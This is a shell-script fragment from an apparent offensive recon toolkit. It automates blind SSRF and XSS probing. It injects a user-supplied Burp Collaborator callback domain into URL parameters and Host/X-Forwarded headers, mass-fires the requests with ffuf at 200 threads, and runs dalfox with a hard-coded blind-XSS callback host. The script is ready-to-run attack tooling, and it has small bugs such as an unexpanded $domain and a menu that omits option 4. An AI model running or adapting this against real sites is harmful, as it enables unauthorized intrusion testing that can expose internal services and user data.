#SSRF------------------------------------------------------------------------------------





ssrf(){	

echo	"1. qsreplace_blind-ssrf (urls.txt parameters_paramspider.txt)   2. qsreplace_blind-ssrf (.txt)  3. Check Blind ssrf in Header,Path,Host & check xss via web cache poisning () "	

mkdir results/ssrf	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                echo -n "Enter the collaborator payload (payloads.burpcollaborator.net) : "
		read domain
                                #Exploit  
                                cat urls.txt parameters_paramspider.txt | sort -u | gf ssrf | httpx -silent | qsreplace http://$domain >> blind_ssrf.txt && ffuf -c -w blind_ssrf.txt -u FUZZ -t 200
 
                                #move file
                                mv blind_ssrf.txt results/ssrf

		;;

	2)
                                echo -n "Enter the file name (*.txt) : "
		read file
                                echo -n "Enter the collaborator payload (payloads.burpcollaborator.net) : "
		read domain
		#Exploit
		cat $file | sort -u | gf ssrf | httpx -silent | qsreplace http://$domain >> blind_ssrf_random-file.txt && ffuf -c -w blind_ssrf_random-file.txt -u FUZZ -t 200
 
                                 #move file
                                  mv blind_ssrf_random-file.txt results/ssrf
		;;
          
	3)
		echo -n "Enter the collaborator payload (payloads.burpcollaborator.net) : "
		read domain
             	                cat urls.txt parameters_paramspider.txt | sort -u | gf ssrf | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: $domain' | grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: $domain' |grep xss) xss3=$(curl -s -L $url -H 'Host: $domain' | grep xss) xss4=$(curl -s -L $url --request-target http://$domain/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://$domain HTTP/1.1 ""\n";done

                                #move file
                                

		;;
	
	4)
		#Exploit  
                                dalfox file xss.txt -b gabriel.xss.ht -o dalfox_JS_blind-xss.txt 
                                dalfox file xss.txt -o dalfox_JS_non-blind-xss.txt
 
                                #move file
                                mv dalfox_JS_blind-xss.txt dalfox_JS_non-blind-xss.txt results/xss
               


		;;
                *)
                        echo "Please give valid choice!!!"
		;;

esac

}





#SSRF------------------------------------------------------------------------------------